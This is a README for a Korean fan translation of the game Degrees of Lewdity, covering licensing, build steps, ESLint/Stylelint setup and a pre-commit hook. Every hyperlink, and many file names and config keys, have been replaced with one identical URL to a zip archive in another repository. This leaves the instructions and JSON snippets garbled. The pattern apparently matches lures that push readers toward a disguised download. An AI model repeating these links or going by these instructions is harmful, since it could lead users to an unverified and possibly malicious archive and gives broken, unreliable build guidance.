# Degrees of Lewdity 한국어 번역판에 대하여

이 번역본은 Vrelnir의 Degrees of Lewdity (https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) 게임 원본을 원본의 CC-BY-NC-SA 라이센스에 의거 동일조건으로 아카라이브 DOL 채널 (https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip)에서 번역중인 번역본입니다.

이 번역본을 기반으로 하는 2차저작물은 CC-BY-NC-SA 라이센스를 따르는 이상 자유롭게 공유(배포 등) 및 변경하실 수 있습니다.

1. BY - 원본과 번역본의 저작자 (출처)가 명기되어야 합니다.
2. NC - 비영리 목적으로만 이용 가능합니다.
3. SA - 원본과 동일한 CC-BY-NC-SA 라이센스를 적용하여야 합니다.

## 참고
- 원본의 CC-BY-NC-SA 라이센스 (영문): 이 번역본에도 포함되어 있는 LICENSE 파일을 참조
- CC-BY-NC-SA 라이센스 한글번역본: https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip
- CC-BY-NC-SA 라이센스 권리 한글번역본: https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip

이 아래부터는 원본의 https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip 의 내용이 이어집니다.
---------------------------------------
# Degrees of Lewdity

## Lexicon of Lewdity

Looking to contribute to Degrees of Lewdity? Read the [Lexicon of Lewdity](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip).

_Failure to do so can lead to your work being denied._

## How to build

### Changing the build version and type

1. Open `01-config\https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`.
2. Edit the `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip` object to the relevant config type.
    - Normal Build - `enableImages` needs to be `true` and `enableLinkNumberify` needs to be `true`.
    - Text Only Build - `enableImages` needs to be `false` and `enableLinkNumberify` needs to be `true`.
    - Android Build - `enableImages` needs to be `true` and `enableLinkNumberify` needs to be `false`.
3. `version` is optional between release versions but will be displayed on screen in several places and stored in the saves made.
4. `debug` is optional and will only effect new games.

### Compiling the html

1. On Windows: Run `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip` or `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`.
2. On Linux: Run `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`
3. Open `Degrees of Lewdity https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`.

### Build Android version (.apk)

See [README in devTools/apkbuilder](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip)

## Development

### Prerequisites

-   Read [Coder's-Guide](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip's-Guide)
-   [https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip 16 or later](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip).

### Optional Prerequisites

1. Install [Tweego](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) and remember the path where it was installed.
2. Add path to `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip` (e.g. `C:\Program Files\Twine\tweego-2.1.0-windows-x64`) to Windows `Path` environment variable.

### Initial setup

1. Install project dependencies:

    ```bash
    npm i
    ```

2. If you use Visual Studio Code:

    1. Install [Twee 3 Language Tools extension](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip)
    2. Install [ESLint extension](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip).
    3. Install [Stylelint extension](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip)
    4. Install and configure [Code Spell Checker extension](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip):
        1. Use "English - United Kingdom" and "English - United States" dictionaries
        2. Enable spellchecking for`twee3-sugarcube-2`, `markdown`, `javascript` and other programming languages
    5. Optionally enable fixing js/css on save. In `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip` set:

        ```json
        // This disables built-in formatting
        "[javascript]": {
          "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip": false
        },
        "[css]": {
          "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip": false
        },
        // This enables running ESLint, Prettier, Stylelint formatting on file save
        "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip": {
          "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip": true,
          "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip": true
        },

        ```

### Linting

#### JavaScript

JavaScript code linting is handled by [`ESLint`](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip).

ESLint is [configured](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) to follow some of best practices ([ESLint Recommended Rules](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip), [JavaScript Standard Style](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip)) with formatting handled by Prettier (`eslint --fix` formats code with Prettier). You don't need to use `Prettier` VS Code extension to format `.js` files.

To run ESLint for single file:

```bash
npx eslint "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip"
```

or for all files inside `game` directory:

```bash
npx eslint "game/**"
```

##### Resolving issues

Some issues are fixable and can be auto-fixed when you save a file (provided ESLint extension is configured to run fix on save) or by running `eslint --fix file_relative_path`

If you find a rule that doesn't make sense for the project you can disable it inside `rules` section inside `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`:

```json
rules: {
  ...
  // SugarCube extends native objects and we follow it
  "no-extend-native": "off",
  ...
}
```

Please discuss the reasons with the team before disabling the rule. Add a comment explaining why the rule was disabled

If ESLint reports a lot of issues for particular file and you cannot fix them all at once feel free to [disable particular rule](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) for the file (there is quick actions menu when code with error is hovered):

```js
/* eslint-disable camelcase -- TODO: Fix variables' names */
...
let demo_rainbow_colors = [
...
```

Add a TODO comment explaining that this will be fixed someday

##### Global variables

ESLint may report a issue like `'myVariable' is not defined`. It means ESLint cannot figure out where the variable is defined. If you really meant to make variable global add the new variable to `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip` `globals` section inside corresponding group:

```json
myVariable: "readonly"
```

If the variable is suppose to be writable set `myVariable: "writable"` instead.

### CSS

CSS linting is handled by [`Stylelint`](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip).

Stylelint is [configured](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) to follow [common conventions](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) along with [rules for properties order](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) and formatting handled by Prettier (`stylelint --fix` formats code with Prettier). You don't need to use `Prettier` VS Code extension to format `.css` files.

To run Stylelint for the file:

```bash
npx stylelint "https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip"
```

or for all CSS file inside `game` directory:

```bash
npx stylelint "game/**/*.css"
```

#### Resolving issues

Some issues are fixable and can be auto-fixed when you save a file (provided Stylelint extension is configured to run fix on save) or by running `stylelint --fix file_relative_path`.

Sometimes all issues cannot be fixed within single "fix" run (e.g. properties order). Simply run fix command several time until all auto-fixable issues are resolved.

If you find a rule that doesn't make sense for the project you can disable it inside `rules` section inside `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`:

```js
rules: {
  // Class and ID patterns disabled for now due to the large amounts of classes and IDs that break this rule
  "selector-class-pattern": null,
  "selector-id-pattern": null,
  ...
}
```

Please discuss the reasons with the team before disabling the rule. Add a comment explaining why the rule was disabled

### Formatting

Formatting CSS and other non-JavaScript file is handled by `Prettier`. Formatting rules are set in `https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip`

### Pre-commit hook

On pre-commit [`lint-staged`](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) using [`husky`](https://raw.githubusercontent.com/pq1234s/dol-kr/main/devTools/androidsdk/image/commandlinetools-linux-6609375_latest.zip) lints/formats `.js`, `.css` with ESLint, Stylelint and formats other supported files with Prettier.

Pre-commit hook is the last quality gate to avoid "bad" code getting into the repository. It's better to make sure you aren't committing files with issues beforehand - you can run command `npm run lint-staged` when you've staged the files to check if there are issues.

If for some reason you really want to commit the code that fails linting add `--no-verify` parameter to `commit` call

```bash
commit --no-verify
```
